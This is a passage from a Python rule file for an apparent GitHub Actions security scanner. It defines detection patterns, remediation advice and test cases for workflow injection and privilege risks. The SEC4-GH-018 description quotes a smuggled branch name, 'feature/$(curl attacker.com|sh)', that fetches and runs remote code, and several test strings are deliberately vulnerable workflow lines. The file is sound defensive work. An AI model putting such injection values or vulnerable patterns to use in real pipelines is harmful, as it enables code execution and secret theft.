            "shell metacharacters execute.  Route through env: and reference\n"
            "as a double-quoted shell var; validate with a case allowlist:\n"
            "  env:\n    MY_INPUT: ${{ inputs.my_input }}\n"
            '  run: case "$MY_INPUT" in staging|prod) ;; *) exit 1;; esac\n'
            "For workflow_dispatch, also set `type: choice` with options.\n"
            "Run `taintly --guide SEC4-GH-008` for the full checklist."
        ),
        reference="https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-scripts-to-handle-untrusted-input",
        test_positive=[
            '        run: echo "${{ inputs.user_input }}"',
            "        run: deploy.sh ${{ github.event.inputs.environment }}",
        ],
        test_negative=[
            "        if: inputs.deploy == true",
            '        # run: echo "${{ inputs.user_input }}"',
            '        run: echo "$MY_INPUT"',
            # with: action-input block — passed to the action, not this
            # workflow's shell (github-script's script: is also a with: input).
            "      - uses: some/action@v1\n        with:\n          output: ${{ inputs.target }}",
            # env: block scalar — an environment assignment, not shell.
            "      - uses: some/action@v1\n        env:\n          OUT: |\n            ${{ inputs.target }}",
            # FP S056: an interpolation embedded (with readability quotes) in a
            # step ``name:`` display label is not a shell sink — the metadata-key
            # allowlist must recognise the quotes around the interpolation.
            "      - name: cleanup cluster '${{ inputs.cluster_name }}' resources\n"
            "        uses: ./.github/actions/cleanup\n",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Workflow dispatch inputs are user-controlled free text that can contain shell "
            "metacharacters, and anyone with workflow dispatch access or a compromised API token "
            "with the workflow scope can supply arbitrary values. "
            "When interpolated directly into a run: block, this creates a command injection path "
            "exploitable by any authorized triggerer — not only external attackers."
        ),
        incidents=["Langflow (2024)", "Ultralytics (Dec 2024)"],
    ),
    # =========================================================================
    # SEC4-GH-009: ACTIONS_ALLOW_UNSECURE_COMMANDS re-enabled — HIGH
    # =========================================================================
    Rule(
        id="SEC4-GH-009",
        title="Insecure workflow commands re-enabled",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "ACTIONS_ALLOW_UNSECURE_COMMANDS=true re-enables the deprecated ::set-env:: and "
            "::add-path:: workflow commands. These were disabled by GitHub in 2020 because "
            "any step that can write to stdout can inject environment variables or PATH entries, "
            "achieving arbitrary code execution. There is no legitimate reason to re-enable this."
        ),
        pattern=RegexPattern(
            match=rf"ACTIONS_ALLOW_UNSECURE_COMMANDS\s*:\s*{_YAML_BOOL_TRUE}",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Remove ACTIONS_ALLOW_UNSECURE_COMMANDS entirely. "
            "Use $GITHUB_ENV and $GITHUB_OUTPUT file-based commands instead of ::set-env:: and ::add-path::."
        ),
        reference="https://github.blog/changelog/2020-10-01-github-actions-deprecating-set-env-and-add-path-commands/",
        test_positive=[
            "        ACTIONS_ALLOW_UNSECURE_COMMANDS: true",
            "        ACTIONS_ALLOW_UNSECURE_COMMANDS: 'true'",
            "    env:\n      ACTIONS_ALLOW_UNSECURE_COMMANDS: true",
            "        ACTIONS_ALLOW_UNSECURE_COMMANDS: yes",
            "        ACTIONS_ALLOW_UNSECURE_COMMANDS: on",
        ],
        test_negative=[
            "        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}",
            "        # ACTIONS_ALLOW_UNSECURE_COMMANDS: true",
        ],
        stride=["E", "T"],
        threat_narrative=(
            "The ::set-env:: commands were disabled in 2020 because any step that writes to stdout "
            "— including linters, test runners, or external tool output — can inject environment "
            "variables or PATH entries into all subsequent steps. "
            "Re-enabling this turns every tool's standard output into a potential privilege "
            "escalation side channel."
        ),
    ),
    # =========================================================================
    # SEC4-GH-010: Spoofable bot actor condition — HIGH
    # =========================================================================
    Rule(
        id="SEC4-GH-010",
        title="Security gate uses spoofable github.actor bot check",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "Workflow uses github.actor == 'dependabot[bot]' (or similar) as a security gate "
            "to grant elevated permissions or skip checks. The actor field reflects the LAST "
            "actor to interact, not the PR author. An attacker can push a follow-up commit after "
            "a Dependabot update to inherit the bot's trust level. "
            "Used in confused-deputy attacks and Dependabot auto-merge bypasses."
        ),
        pattern=RegexPattern(
            match=r"github\.actor\s*==\s*['\"]?(dependabot\[bot\]|renovate\[bot\]|github-actions\[bot\])['\"]?",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Use github.event.sender.login or check the PR author via github.event.pull_request.user.login. "
            "For Dependabot auto-merge, use the official Dependabot metadata action and verify "
            "update-type, not the actor field."
        ),
        reference="https://woodruffw.github.io/zizmor/audits/bot-conditions/",
        test_positive=[
            "      if: github.actor == 'dependabot[bot]'",
            "      if: github.actor == 'renovate[bot]'",
            '      if: github.actor == "github-actions[bot]"',
        ],
        test_negative=[
            "      if: github.event.pull_request.user.login == 'dependabot[bot]'",
            "      # if: github.actor == 'dependabot[bot]'",
        ],
        stride=["S", "E"],
        threat_narrative=(
            "github.actor reflects the last actor to interact with a PR, which can be changed by "
            "pushing a follow-up commit after a trusted bot update, allowing an attacker to inherit "
            "the bot's elevated trust level. "
            "This confused-deputy pattern has been used in Dependabot auto-merge bypasses where "
            "attackers gained repository write access without direct approval."
        ),
    ),
    # =========================================================================
    # SEC4-GH-011: LOTP tools after pull_request_target — CRITICAL
    # =========================================================================
    Rule(
        id="SEC4-GH-011",
        title="Living-off-the-pipeline tools run in pull_request_target context",
        severity=Severity.CRITICAL,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "Workflow uses pull_request_target AND runs build tools (npm, yarn, pip, make, "
            "gradle, mvn, cargo, bundle) that read attacker-controlled files (package.json, "
            "Makefile, pom.xml, build.gradle, etc.) from the PR branch. "
            "Even without explicit actions/checkout, some tools run lifecycle hooks from "
            "the repository root that can execute arbitrary attacker code. "
            "This pattern was exploited in the Ultralytics supply chain compromise (Dec 2024)."
        ),
        pattern=ContextPattern(
            # Shared build-tool anchor — see taintly/rules/github/_build_tools.py
            # for the full tool list and rationale.  Covers npm/yarn/pnpm
            # (install + user-scripts via run/build/test), pip install (., -e ., -r),
            # python setup.py / -m build, make, cmake, cargo, go, gradle/gradlew,
            # mvn/mvnw, composer, bundle, docker build.
            # `pip install PackageName` is intentionally NOT in the shared anchor
            # because it installs from PyPI and does not read attacker-controlled
            # files.  The shared anchor's `pip install` arm only matches the
            # repo-file-reading forms: `.`, `-e .`, `--editable .`, `-r <file>`.
            anchor=_BUILD_TOOL_ANCHOR,
            # FP-audit class A: bare ``pull_request_target`` substring
            # in ``requires`` matched the trigger name anywhere in the
            # file, including inside defensive conditionals
            # (``github.event_name == 'pull_request_target'``) where
            # the workflow routes untrusted triggers to the trusted
            # ``main`` branch.  That produced the ONLY CRITICAL FP in
            # the audit (transformers/slack-report.yml).  Tightened to
            # require a real trigger-declaration shape.  ``(?m)`` is
            # needed because ContextPattern compiles regexes without
            # MULTILINE by default and ``requires`` is a file-wide
            # check.
            requires=_PRT_TRIGGER_RE,
            exclude=[
                r"^\s*#",
                _IGNORE_SCRIPTS_INSTALL_LINE_RE,
                # BUG-8a: exclude "make" in JSON-style YAML string values like "message": "...make..."
                # Lines where the YAML key itself is double-quoted (JSON-style data field)
                # are content, not executable shell commands.
                r"""^\s*"[^"]+"\s*:\s*["']""",
                # BUG-8b: exclude common English phrase "make sure" which appears in PR templates
                # and documentation strings (e.g. Django's new_contributor_pr.yml pr-message: | block).
                r"""\bmake\s+sure\b""",
            ],
            # Suppress findings in jobs explicitly gated to non-PRT events.
            # A job with `if: github.event_name == 'push'` (or schedule, workflow_dispatch,
            # etc.) never runs under pull_request_target, so build tools there cannot
            # be LOTP-exploited. Also covers `!= 'pull_request_target'` forms.
            anchor_job_exclude=(
                r"if:.*github\.event_name\s*==\s*['\"]"
                r"(?:push|schedule|workflow_dispatch|workflow_call|merge_group"
                r"|release|deployment|pull_request)['\"]"
                r"|if:.*github\.event_name\s*!=\s*['\"]pull_request_target['\"]"
            ),
        ),
        remediation=(
            "Do not run build tools in pull_request_target workflows — they\n"
            "execute lifecycle hooks from the PR source tree with your secrets.\n"
            "Use the two-workflow pattern: pull_request for build/test (no\n"
            "secrets), workflow_run for privileged operations that consume\n"
            "only the build artifact (never the PR code).\n"
            "Run `taintly --guide SEC4-GH-011` for the full checklist."
        ),
        reference="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/",
        test_positive=[
            "on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - run: npm install && npm test",
            "on:\n  pull_request_target:\njobs:\n  test:\n    steps:\n      - run: pip install -r requirements.txt",
            # pip3 — common on Debian / Ubuntu / pyenv installs.  Was an
            # FN before the pip\d* anchor widening.
            "on:\n  pull_request_target:\njobs:\n  test:\n    steps:\n      - run: pip3 install -e .",
            # poetry install reads pyproject.toml and runs the build
            # backend; attacker-controllable from a PR.
            "on:\n  pull_request_target:\njobs:\n  test:\n    steps:\n      - run: poetry install",
            # pipx install <local path> — same setup.py / pyproject.toml
            # hook execution as `pip install .`, just with isolation.
            "on:\n  pull_request_target:\njobs:\n  test:\n    steps:\n      - run: pipx install .",
        ],
        test_negative=[
            "on:\n  pull_request:\njobs:\n  build:\n    steps:\n      - run: npm install",
            "on:\n  push:\njobs:\n  build:\n    steps:\n      - run: make build",
            # Job guarded to only run on pull_request events — safe even in PRT file
            "on:\n  pull_request_target:\n  pull_request:\njobs:\n  lint:\n    if: github.event_name == 'pull_request'\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm ci && npm run lint",
            # BUG-8a: English prose in JSON-style YAML message field
            'on:\n  pull_request_target:\njobs:\n  manage:\n    steps:\n      - uses: tiangolo/issue-manager@0.6.0\n        with:\n          config: \'{"message": "make sure to read the docs about contributing"}\'\n',
            # BUG-8b: "make sure" English phrase in pr-message block scalar
            "on:\n  pull_request_target:\njobs:\n  greet:\n    steps:\n      - run: echo hi\n        env:\n          MSG: make sure to check the docs\n",
            # pip install of a named PyPI package does NOT read from repo — safe in LOTP context
            "on:\n  pull_request_target:\njobs:\n  review:\n    steps:\n      - run: pip install PyGithub\n",
            "on:\n  pull_request_target:\njobs:\n  review:\n    steps:\n      - run: pip install --upgrade pip\n",
            # pip3 / pipx install of a PyPI name — same reasoning as pip.
            "on:\n  pull_request_target:\njobs:\n  review:\n    steps:\n      - run: pip3 install requests\n",
            "on:\n  pull_request_target:\njobs:\n  review:\n    steps:\n      - run: pipx install cowsay\n",
            # Poetry read-only / version subcommands don't trigger the build backend.
            "on:\n  pull_request_target:\njobs:\n  review:\n    steps:\n      - run: poetry --version\n",
            "on:\n  pull_request_target:\njobs:\n  review:\n    steps:\n      - run: poetry show\n",
        ],
        stride=["E", "T"],
        threat_narrative=(
            "Build tools like npm install, pip install ., and mvn execute lifecycle scripts defined "
            "in attacker-controlled files (package.json, pyproject.toml, pom.xml) from the PR branch, "
            "giving an external contributor arbitrary code execution in the privileged "
            "pull_request_target context with write access and full secret exposure. "
            "This pattern was exploited in the Ultralytics supply chain compromise (December 2024) "
            "via malicious postinstall hooks."
        ),
        incidents=["Ultralytics (Dec 2024)"],
    ),
    # =========================================================================
    # SEC4-GH-012: secrets: inherit in workflow_call — HIGH
    # =========================================================================
    Rule(
        id="SEC4-GH-012",
        title="secrets: inherit passes all caller secrets to called workflow",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "secrets: inherit passes ALL secrets held by the caller workflow to the called "
            "reusable workflow. Any compromise of the called workflow (or its transitive "
            "dependencies) exposes every secret the caller has access to. "
            "Prefer explicitly listing only the secrets the called workflow actually needs."
        ),
        pattern=ReusableWorkflowSecretsInheritPattern(local=False),
        remediation=(
            "`secrets: inherit` forwards every caller secret to the callee\n"
            "— one compromised transitive action exfiltrates the whole set.\n"
            "Enumerate the callee's actual `${{ secrets.X }}` references,\n"
            "replace with an explicit list, declare them in the callee's\n"
            "`workflow_call: secrets:` block, and pin `uses:` to a SHA:\n"
            "  secrets:\n    DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}\n"
            "Run `taintly --guide SEC4-GH-012` for the full checklist."
        ),
        reference="https://woodruffw.github.io/zizmor/audits/secrets-inherit/",
        test_positive=[
            "jobs:\n  call:\n    uses: owner/repo/.github/workflows/deploy.yml@v1\n    secrets: inherit",
            "jobs:\n  call:\n    uses: 'owner/repo/.github/workflows/deploy.yml@v1'\n    secrets: inherit",
            "jobs:\n  call:\n    uses: owner/repo/.github/workflows/deploy.yml@v1\n    secrets: inherit  # pass all",
            "jobs:\n  call:\n    uses: owner/repo/.github/workflows/deploy.yml@v1\n    secrets:\n      inherit",
        ],
        test_negative=[
            "jobs:\n  call:\n    uses: ./.github/workflows/reusable.yml\n    secrets: inherit",
            "      secrets:\n        MY_SECRET: ${{ secrets.MY_SECRET }}",
            "      # secrets: inherit",
        ],
        stride=["I", "E"],
        threat_narrative=(
            "Passing all secrets to a reusable workflow exposes every credential the caller has "
            "access to, regardless of what the called workflow actually needs. "
            "A single compromised action in the called workflow — or any of its transitive "
            "dependencies — can exfiltrate your entire secret store in one extraction."
        ),
    ),
    # =========================================================================
    # SEC4-GH-013: if: | always evaluates true — HIGH
    # =========================================================================
    Rule(
        id="SEC4-GH-013",
        title="if: block-scalar condition always evaluates true",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A YAML block-scalar `if: |` makes the entire condition a multi-line string. "
            "In GitHub Actions, a non-empty string always evaluates to true, so this "
            "silently bypasses the access control check. Jobs and steps with this pattern "
            "run unconditionally regardless of the intended condition logic."
        ),
        pattern=SequencePattern(
            # Match `if: |` that is NOT followed (within 8 lines) by any GitHub Actions
            # expression token. Real multi-line expressions like:
            #   if: |
            #     github.event.inputs.foo != 'true'
            #     && github.event.inputs.bar != 'true'
            # work correctly in GitHub Actions (newlines are whitespace in expression parsing).
            # Only flag when the block scalar contains plain prose (no operators/context vars),
            # which always evaluates to true because a non-empty string is truthy.
            pattern_a=r"^\s*if:\s*\|[-+]?\s*(#.*)?$",
            absent_within=(
                r"(?:==|!=|&&|\|\||>=|<=|>|<"
                r"|contains\(|startsWith\(|endsWith\(|format\(|join\(|fromJson\(|toJson\("
                r"|github\.|env\.|vars\.|inputs\.|steps\.|needs\.|runner\.|secrets\.|matrix\."
                r"|always\(\)|success\(\)|failure\(\)|cancelled\(\)"
                r"|\$\{\{)"
            ),
            lookahead_lines=8,
            exclude=[r"^\s*#\s"],
        ),
        remediation=(
            "A YAML block-scalar `if: |` makes the body a non-empty string,\n"
            "which GitHub Actions treats as truthy — the gate silently passes.\n"
            "For multi-line expressions use STRIP-chomp `>-` (not `|` or `>`,\n"
            "both keep a trailing newline); for single-line use plain `if:`:\n"
            "  if: >-\n"
            "    github.event.inputs.foo != 'true'\n"
            "    && github.event.inputs.bar != 'true'\n"
            "Run `taintly --guide SEC4-GH-013` for the full checklist."
        ),
        reference="https://docs.zizmor.sh/audits/if-always-true/",
        test_positive=[
            # Plain string in block scalar — no expression operators — always-true
            "jobs:\n  build:\n    if: |\n      Run this job always\n    runs-on: ubuntu-latest",
            "jobs:\n  test:\n    if: |\n      This description means nothing to GitHub Actions\n    runs-on: ubuntu-latest",
        ],
        test_negative=[
            "      if: github.event_name == 'push'",
            "      if: github.actor != 'bot'",
            "      # if: |",
            # Real multi-line expression — contains operators → should NOT fire
            "jobs:\n  build:\n    if: |\n      github.event.inputs.foo != 'true'\n      && github.event.inputs.bar != 'true'\n    runs-on: ubuntu-latest",
            # Block scalar with github. context variable → should NOT fire
            "jobs:\n  test:\n    if: |\n      github.event_name == 'push'\n    runs-on: ubuntu-latest",
        ],
        stride=["E", "S"],
        threat_narrative=(
            "A non-empty string in a YAML block-scalar always evaluates to true in GitHub Actions' "
            "expression engine, silently bypassing the apparent conditional check and making the "
            "job or step run unconditionally. "
            "The security gate appears present in code review but provides no actual access control "
            "at runtime — an attacker benefits from the gate's removal without any code change."
        ),
    ),
    # =========================================================================
    # SEC4-GH-014: Two-step output injection — attacker context → GITHUB_OUTPUT → run
    # =========================================================================
    Rule(
        id="SEC4-GH-014",
        title="Attacker-controlled value laundered through step output into shell command",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "An attacker-controlled GitHub context value (PR title, issue body, head_ref, etc.) "
            "is written to $GITHUB_OUTPUT in one step and then read back via "
            "${{ steps.X.outputs.* }} in a subsequent run: block. "
            "This two-step pattern bypasses direct context injection rules by laundering "
            "the tainted value through a step output. The injection risk is identical to "
            "writing the context value directly into a run: block."
        ),
        pattern=ContextPattern(
            anchor=r"\$\{\{\s*steps\.[a-zA-Z0-9_-]+\.outputs\.",
            requires=(
                # Span bounded ({0,512}) so an adversarial ${{-heavy blob
                # can't drive quadratic backtracking. Real Actions
                # expressions are far shorter, so this is behavior-
                # preserving on true positives. See test_redos_bounds.py.
                r"\$\{\{[^}]{0,512}"
                r"(event\.(issue\.(title|body)|pull_request\.(title|body)|comment\.body"
                r"|head_commit\.message|review\.body)|head_ref)"
                r"[^}]{0,512}\}\}[^#\n]*>>\s*\$GITHUB_OUTPUT"
            ),
            exclude=[r"^\s*#"],
            # steps.X.outputs can only reference steps within the same job —
            # cross-job references use needs.job.outputs, not steps.X.outputs.
            # scope="job" prevents FPs where job A writes attacker context to
            # GITHUB_OUTPUT and unrelated job B uses ${{ steps.X.outputs.* }}.
            scope="job",
        ),
        remediation=(
            "Laundering attacker context through `$GITHUB_OUTPUT` doesn't\n"
            "neutralize it — the downstream `run:` still splices the value\n"
            "into shell source.  Sanitize at the WRITE site (apply the\n"
            "SEC4-GH-006 pattern to step A) AND route the consumer through\n"
            "an `env:` key with double-quoted shell expansion:\n"
            "  env:\n    SAFE_VAL: ${{ steps.x.outputs.value }}\n"
            '  run: deploy.sh "$SAFE_VAL"\n'
            "Run `taintly --guide SEC4-GH-014` for the full checklist."
        ),
        reference="https://securitylab.github.com/resources/github-actions-untrusted-input/",
        test_positive=[
            (
                '        run: echo "TITLE=${{ github.event.pull_request.title }}" >> $GITHUB_OUTPUT\n'
                "        run: deploy.sh ${{ steps.extract.outputs.TITLE }}"
            ),
            (
                '        run: echo "REF=${{ github.head_ref }}" >> $GITHUB_OUTPUT\n'
                "        run: git checkout ${{ steps.getref.outputs.REF }}"
            ),
        ],
        test_negative=[
            # github.sha is a fixed commit hash, not attacker-controlled — not in requires pattern
            (
                '        run: echo "SHA=${{ github.sha }}" >> $GITHUB_OUTPUT\n'
                "        run: git checkout ${{ steps.getsha.outputs.SHA }}"
            ),
            # Step output used safely via env var (anchor matches env line, but that's acceptable
            # — the important thing is the requires pattern does not fire without GITHUB_OUTPUT write)
            '        run: echo "test passed"',
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Routing attacker-controlled context through a step output before using it in a shell "
            "command launders the tainted value past direct-injection detectors while preserving "
            "the injection risk at the downstream step. "
            "The output write appears benign in isolation; the injection only manifests when the "
            "output is consumed in a run: block, making it harder to detect in code review."
        ),
    ),
    # =========================================================================
    # SEC4-GH-015: Matrix injection from github.event context
    # =========================================================================
    Rule(
        id="SEC4-GH-015",
        title="Build matrix value sourced from attacker-controlled event context",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A GitHub Actions workflow defines a build matrix where at least one "
            "matrix value is sourced directly from the GitHub event context "
            "(github.event.*). "
            "Matrix values are used to parameterise parallel job runs — if an attacker "
            "controls the event payload (e.g. a pull request title, body, or label), "
            "they control what the matrix expands to. Depending on how matrix values "
            "are used in subsequent steps, this can lead to command injection, "
            "arbitrary file writes, or exfiltration of secrets. "
            "The `fromJSON()` pattern is especially dangerous: "
            "`strategy.matrix.include: ${{ fromJSON(github.event.pull_request.body) }}` "
            "lets an attacker craft a matrix that spawns jobs with arbitrary configurations. "
            "(`github.event.inputs.*` is excluded — it is populated only on "
            "workflow_dispatch, which requires write access, so it is maintainer-controlled.)"
        ),
        pattern=PathPattern(
            path=r"strategy\.matrix\.",
            # github.event_name is NOT attacker-controlled — require github.event.<field>.
            # (?!inputs\.) excludes github.event.inputs.* (workflow_dispatch payload,
            # write-gated → maintainer-controlled), matching the canonical
            # _DANGEROUS_GITHUB_CONTEXT_RE. Field FPs: gemini-cli release-promote,
            # any dispatch-input matrix.
            value=r"\$\{\{.*github\.event\.(?!inputs\.)[a-zA-Z]",
            exclude=[r"^\s*#"],
        ),
        remediation=(
            "Never source `strategy.matrix` values from `${{ github.event.* }}`\n"
            "— the attacker who controls the payload controls parallel job\n"
            "expansion, including `runs-on:` labels.  Prefer a static list;\n"
            "if dynamism is needed, use `workflow_dispatch` with `type: choice`\n"
            "or a pre-job that emits a matrix from a validated allowlist:\n"
            "  strategy:\n    matrix:\n      os: [ubuntu-latest, windows-latest]\n"
            "Run `taintly --guide SEC4-GH-015` for the full checklist."
        ),
        reference="https://securitylab.github.com/resources/github-actions-untrusted-input/",
        test_positive=[
            "strategy:\n  matrix:\n    include: ${{ github.event.pull_request.body }}",
        ],
        test_negative=[
            "strategy:\n  matrix:\n    os: [ubuntu-latest, windows-latest]",
            "strategy:\n  matrix:\n    node: [18, 20, 22]",
            "# strategy:\n#   matrix:\n#     config: ${{ fromJSON(github.event.inputs.x) }}",
            # github.event_name is not attacker-controlled
            "strategy:\n  matrix:\n    skip: ${{ github.event_name == 'pull_request' }}",
            # github.event.inputs.* is the workflow_dispatch payload — settable
            # only with write access, so maintainer-controlled, not attacker-
            # controlled. Excluded to align with _DANGEROUS_GITHUB_CONTEXT_RE.
            "strategy:\n  matrix:\n    config: ${{ fromJSON(github.event.inputs.matrix) }}",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Build matrix values from event context allow an attacker who controls the event payload "
            "to direct parallel jobs to attacker-controlled environments or inject values into "
            "matrix-derived shell commands. "
            "The fromJSON() pattern is the most dangerous form, letting an attacker craft a matrix "
            "that spawns jobs with arbitrary configurations including attacker-controlled runner labels."
        ),
    ),
    # =========================================================================
    # SEC4-GH-016: Reusable workflow caller passes event context to with: params
    # =========================================================================
    Rule(
        id="SEC4-GH-016",
        title="Reusable workflow called with attacker-controlled event context as input",
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A GitHub Actions job calls an external reusable workflow and passes "
            "a value sourced from the event context (github.event.*) as a `with:` "
            "input parameter. "
            "Reusable workflows run with the caller's permissions and secrets. "
            "If the called workflow uses the passed input in a shell step without "
            "sanitization, an attacker who controls the event payload can achieve "
            "command injection inside the reusable workflow — with access to all "
            "secrets available to the caller. "
            "This risk is compounded because the injection point is in a different "
            "repository from where the payload originates."
        ),
        pattern=ContextPattern(
            # github.event_name is the event type (not attacker-controlled)
            # github.event.<field> is the payload (attacker-controlled)
            anchor=r"\$\{\{.*github\.event\.[a-zA-Z]",
            requires=r"uses:\s+[a-zA-Z0-9_-]+/[a-zA-Z0-9_.-]+/\.github/workflows/",
            exclude=[
                r"^\s*#",
                # A reusable-workflow input whose ONLY event source is a
                # server-minted numeric/hex ID (``github.event.number`` — the
                # PR number, ``github.run_id``, etc.) is not injectable: an
                # integer cannot carry a shell metacharacter or break out of a
                # downstream command.  Field-precision FP S040
                # (``pull_request_number: ${{ github.event.number || 0 }}``).
                _NONINJECTABLE_ONLY_LINE_RE,
            ],
            scope="job",
        ),
        remediation=(
            "Reusable workflows run with the caller's secrets — treat their\n"
            "`with:` inputs as a trust boundary.  Never pipe ${{ github.event.* }}\n"
            "straight into a reusable workflow call.  Narrow the value at the\n"
            "caller via `workflow_dispatch` with `type: choice`, and validate\n"
            "again inside the reusable workflow with a Bash `case` allowlist.\n"
            "Pin `uses:` to a full SHA, not a tag.\n"
            "Run `taintly --guide SEC4-GH-016` for the full checklist."
        ),
        reference="https://docs.github.com/en/actions/sharing-automations/reusing-workflows",
        test_positive=[
            (
                "jobs:\n  call:\n"
                "    uses: org/repo/.github/workflows/deploy.yml@abc123\n"
                "    with:\n"
                "      env: ${{ github.event.inputs.environment }}"
            ),
        ],
        test_negative=[
            (
                "jobs:\n  call:\n"
                "    uses: org/repo/.github/workflows/deploy.yml@abc123\n"
                "    with:\n"
                "      env: staging"
            ),
            "      env: ${{ inputs.environment }}",
            # FP S040: the only event source is a server-minted numeric ID
            # (the PR number) — an integer cannot inject into a downstream
            # command, so passing it as a reusable-workflow input is benign.
            (
                "jobs:\n  call:\n"
                "    uses: org/repo/.github/workflows/build.yml@abc123\n"
                "    with:\n"
                "      pull_request_number: ${{ github.event.number || 0 }}"
            ),
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Passing event-sourced values to a reusable workflow as with: inputs creates an "
            "injection path that crosses repository boundaries, making it harder to trace and "
            "review in code. "
            "If the called workflow uses the input in a shell step, an attacker who controls the "
            "event payload can inject commands that run with the caller's secrets in a different "
            "repository's workflow context."
        ),
    ),
    # =========================================================================
    # CICD-SEC-4 continued — GitHub auto-populated env vars used unquoted in
    # shell (closes FINDINGS §F-5)
    # =========================================================================
    Rule(
        id="SEC4-GH-018",
        title=(
            "Attacker-controlled GitHub auto-env var used unquoted in shell "
            "(GITHUB_HEAD_REF / GITHUB_REF_NAME / GITHUB_ACTOR)"
        ),
        severity=Severity.HIGH,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        description=(
            "GitHub Actions populates `$GITHUB_HEAD_REF`, "
            "`$GITHUB_REF_NAME`, and `$GITHUB_ACTOR` from values the "
            "PR / tag / actor source chooses: anyone who can open a "
            "PR picks the head branch name; anyone with tag-push "
            "access picks the tag name; the actor on a fork-triggered "
            "event is the PR author. Branch and tag names accept "
            "characters that are shell-active (`$`, `(`, `` ` ``, "
            "spaces) when not quoted, so a name like "
            "`feature/$(curl attacker.com|sh)` becomes command "
            "injection wherever the variable is referenced unquoted. "
            "Maintainer-controlled vars like `$GITHUB_BASE_REF` or "
            "`$GITHUB_REPOSITORY_OWNER` are out of scope for this "
            "rule — they're hygiene at most and are covered by "
            "SEC4-GH-020."
        ),
        pattern=RegexPattern(
            match=(r"\$\{?(GITHUB_REF_NAME|GITHUB_HEAD_REF|GITHUB_ACTOR)\}?"),
            exclude=[
                r"^\s*#",
                r"^\s*[\w_]+:\s*\$\{?GITHUB_",  # YAML key-value assignment
                r"^\s*[\w_]+:\s*'[^']*\$",  # YAML value in single-quoted string
                r'^\s*[\w_]+:\s*"[^"]*\$',  # YAML value in double-quoted string
                r"^\s*(?:-\s*)?if:",  # if: expressions evaluated by GH engine
                # Double-quoted shell context anywhere on the line — `"$VAR"`
                # preserves word boundaries when passed to echo/printf.
                r'"[^"]*\$\{?(GITHUB_REF_NAME|GITHUB_HEAD_REF|GITHUB_ACTOR)\}?[^"]*"',
                # Single-quoted shell context — `$VAR` inside `'...'` is
                # literal per POSIX sh §2.2.2.
                r"'[^']*\$\{?(GITHUB_REF_NAME|GITHUB_HEAD_REF|GITHUB_ACTOR)\}?[^']*'",
            ],
            heredoc_aware=True,
        ),
        remediation=(
            "Always double-quote attacker-controlled GitHub env vars in shell:\n"
            '  - echo "$GITHUB_HEAD_REF"\n'
            "For values passed to subcommands that may parse the value, sanitize:\n"
            '  - SAFE_REF="${GITHUB_HEAD_REF//[^a-zA-Z0-9._-]/}"\n'
            '  - docker tag image:latest "image:$SAFE_REF"'
        ),
        reference=(
            "https://docs.github.com/en/actions/learn-github-actions/variables"
            "#default-environment-variables"
        ),
        test_positive=[
            "      - run: echo $GITHUB_HEAD_REF",
            "      - run: deploy.sh $GITHUB_REF_NAME",
            "      - run: echo Hi $GITHUB_ACTOR",
        ],
        test_negative=[
            '      - run: echo "$GITHUB_HEAD_REF"',
            "      - run: echo '$GITHUB_REF_NAME is safe'",
            "      # uses $GITHUB_ACTOR",
            '      - if: github.ref_name == "main"',
            # Out of scope: maintainer-controlled vars handled by SEC4-GH-020.
            "      - run: echo Target $GITHUB_BASE_REF",
            "      - run: echo Owner $GITHUB_REPOSITORY_OWNER",
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Any contributor who can open a PR or push a tag chooses the "
            "value of $GITHUB_HEAD_REF / $GITHUB_REF_NAME, and the actor "
            "of a fork-triggered event chooses $GITHUB_ACTOR. An unquoted "
            "reference in a build script is a direct command-injection "
            "primitive; the injected commands run with the runner's "
            "GITHUB_TOKEN and any mounted secrets."
        ),
        incidents=[],
    ),
    # =========================================================================
    # SEC4-GH-020 — Maintainer-controlled GitHub env vars unquoted in shell
    #
    # Lint-only / hygiene companion to SEC4-GH-018. These variables
    # ($GITHUB_BASE_REF, $GITHUB_REPOSITORY_OWNER, $GITHUB_REPOSITORY,
    # $GITHUB_WORKFLOW, $GITHUB_JOB) are populated from values the
    # workflow's own repo or maintainer controls — not the PR author.
    # An unquoted reference is still a quoting bug worth fixing, but
    # the threat surface is fundamentally different (no attacker
    # injection primitive), so it doesn't deserve HIGH severity or a
    # PPE narrative.
    # =========================================================================
    Rule(
        id="SEC4-GH-020",
        title=("Maintainer-controlled GitHub auto-env var used unquoted in shell (hygiene)"),
        severity=Severity.MEDIUM,
        platform=Platform.GITHUB,
        owasp_cicd="CICD-SEC-4",
        confidence="low",
        description=(
            "GitHub auto-populated env vars whose values are not "
            "attacker-controlled — `$GITHUB_BASE_REF` (PR target "
            "branch), `$GITHUB_REPOSITORY_OWNER`, "
            "`$GITHUB_REPOSITORY`, `$GITHUB_WORKFLOW`, `$GITHUB_JOB` "
            "— are still subject to standard shell-quoting hygiene: "
            "an unquoted reference can break on values containing "
            "spaces or special characters. Unlike "
            "$GITHUB_HEAD_REF / $GITHUB_REF_NAME / $GITHUB_ACTOR "
            "(handled by SEC4-GH-018), these values are chosen by "
